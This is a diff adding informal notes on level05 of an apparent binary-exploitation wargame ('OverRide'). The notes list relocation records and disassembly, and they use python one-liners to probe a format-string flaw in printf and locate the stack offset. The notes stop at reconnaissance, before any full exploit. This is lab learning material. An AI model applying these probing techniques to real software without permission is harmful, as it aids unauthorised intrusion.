@@ -1,0 +1,36 @@
+level05@OverRide:~$ objdump -R level05
+
+level05:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf             # Probably vuln
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+
+# We test
+> python -c 'print "AAAA"' | ./level05    # So the program lower case what we input
+aaaa
+
+> python -c 'print "aaaa%x " * 50' | ./level05
+aaaa64 aaaaf7fcfac0 aaaaf7ec3af9 aaaaffffd6bf aaaaffffd6be aaaa0 aaaaffffffff aaaaffffd744 aaaaf7fdb000 aaaa61616161 aaaa61207825 aaaa25616161 # Ok
+
+> python -c 'print "aaaabbbbcccc %10$x %11$x %12$x"' | ./level05
+aaaabbbbcccc 61616161 62626262 63636363
+
+# Following the exec, I think to prog loop and check uppercase and loop to lower them btw
+ 804844c:	81 ec 90 00 00 00    	sub    $0x90,%esp             # 0x90: 144
+ 
+ 8048466:	c7 44 24 04 64 00 00 	movl   $0x64,0x4(%esp)        # 0x64: 100
+ 804846e:	8d 44 24 28          	lea    0x28(%esp),%eax        # 0x28: 40
+ 8048472:	89 04 24             	mov    %eax,(%esp)
+ 8048475:	e8 d6 fe ff ff       	call   8048350 <fgets@plt>.
+
+> python -c 'print "a" * 98 + "bbbb"' | ./level05
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+
+
